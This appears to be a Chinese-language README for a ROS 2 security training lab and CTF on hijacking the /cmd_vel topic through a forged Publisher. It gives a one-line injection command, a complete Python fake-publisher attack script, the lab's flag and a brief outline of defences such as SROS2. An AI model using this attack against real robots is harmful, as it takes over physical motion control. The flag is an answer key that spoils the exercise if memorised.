# ROS 2 Topic 劫持靶场（Lab3）

> **Level 3：Topic 劫持（伪 Publisher）**
> 攻击目标：通过伪造 Publisher 向 `/cmd_vel` 注入控制指令，接管机器人运动控制。

---

## 1. 靶场背景

在 ROS 2 系统中，节点之间通过 **DDS（Data Distribution Service）** 进行通信。

在默认配置下：

* DDS **没有启用身份认证**
* ROS 2 **不会校验 Publisher 的合法来源**

这意味着：

> **任何能接入同一 DDS Domain 的节点，都可以向关键 Topic 发布数据**。

在真实机器人系统中，如果 `/cmd_vel` 这类运动控制 Topic 未加防护，将直接导致**远程控制机器人**的风险。

---

## 2. 攻击场景说明

### 2.1 系统角色

| 角色           | 说明                          |
| ------------ | --------------------------- |
| robot_node   | 模拟机器人，订阅 `/cmd_vel` 并打印运动日志 |
| monitor_node | 安全监控节点，检测异常控制并输出 flag       |
| 攻击者（红队）      | 宿主机上的恶意 ROS 2 节点            |

---

### 2.2 攻击目标

* 🎯 Topic：`/cmd_vel`
* 🎯 消息类型：`geometry_msgs/msg/Twist`
* 🎯 效果：

  * 机器人出现被控制的运动行为
  * `monitor_node` 输出 flag

---

## 3. 靶场启动方式

在 `lab3` 目录下构建并启动靶场：

```bash
sudo docker rm -f topic_hijack_lab 2>/dev/null
sudo docker build -t ros2-topic-hijack-lab .
sudo docker run -it --name topic_hijack_lab ros2-topic-hijack-lab
```

启动成功后，容器内会自动：

* source ROS 2 环境
* 启动 `robot_node`
* 启动 `monitor_node`
* 直接进入交互 shell

---

## 4. 攻击方式一：命令行注入（快速验证）

> 适用于 CTF / 教学场景的最简单攻击方式

### 4.1 攻击命令（宿主机执行）

```bash
ros2 topic pub /cmd_vel geometry_msgs/msg/Twist "{linear: {x: 5.0}}"
```

### 4.2 攻击原理

* ROS 2 CLI 自动创建一个新的 Publisher
* 该 Publisher **未经过任何身份校验**
* `/cmd_vel` 的订阅方直接接收并执行指令

---

### 4.3 成功标志

容器内日志应出现：

```text
[WARN]  [robot_node]: 🚨 Robot moving! linear.x=5.0
[FATAL] [monitor_node]: 🏴 FLAG: flag{fake_publisher_takeover}
```

---

## 5. 攻击方式二：伪造 Publisher 节点（真实攻击）

> 更贴近真实攻击场景的方式

### 5.1 编写恶意 Publisher

在宿主机新建攻击脚本：

```bash
mkdir -p ~/ros2_attack
cd ~/ros2_attack
nano fake_pub.py
```

写入以下代码：

```python
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
from rclpy.qos import QoSProfile, ReliabilityPolicy

class FakePublisher(Node):
    def __init__(self):
        super().__init__('fake_cmd_vel_pub')

        qos = QoSProfile(
            depth=10,
            reliability=ReliabilityPolicy.BEST_EFFORT
        )

        self.pub = self.create_publisher(Twist, '/cmd_vel', qos)
        self.timer = self.create_timer(0.1, self.attack)

    def attack(self):
        msg = Twist()
        msg.linear.x = 5.0
        self.pub.publish(msg)
        self.get_logger().info('🔥 Hijacking /cmd_vel')

def main():
    rclpy.init()
    node = FakePublisher()
    rclpy.spin(node)
    rclpy.shutdown()
```

---

### 5.2 运行攻击节点

```bash
python3 fake_pub.py
```

---

### 5.3 攻击效果

* 持续向 `/cmd_vel` 注入控制指令
* 可与合法 Publisher 竞争控制权
* 成功触发监控节点并输出 flag

---

## 6. 漏洞成因分析

### 6.1 核心问题

* DDS 默认 **无身份认证**
* ROS 2 **不校验 Publisher 来源**
* `/cmd_vel` 缺乏访问控制

### 6.2 攻击本质

> **控制平面信任被滥用**

任何节点只要：

* 能发现 Topic
* QoS 匹配

即可参与通信。

---

## 7. 防守方向（预告）

该靶场可用于验证以下防御措施：

* SROS2（DDS Security / Enclave）
* `permissions.xml` Topic ACL
* QoS 限制策略

开启防守后：

> 攻击节点将无法发布 `/cmd_vel`

---

## 8. Flag

```text
flag{fake_publisher_takeover}
```

---

## 9. 适用场景

* ROS 2 安全教学
* 机器人安全实验
* CTF 攻防靶场
* 研究生课程实验

---

**Author**: ROS 2 Security Lab
**Level**: Intermediate / Offensive

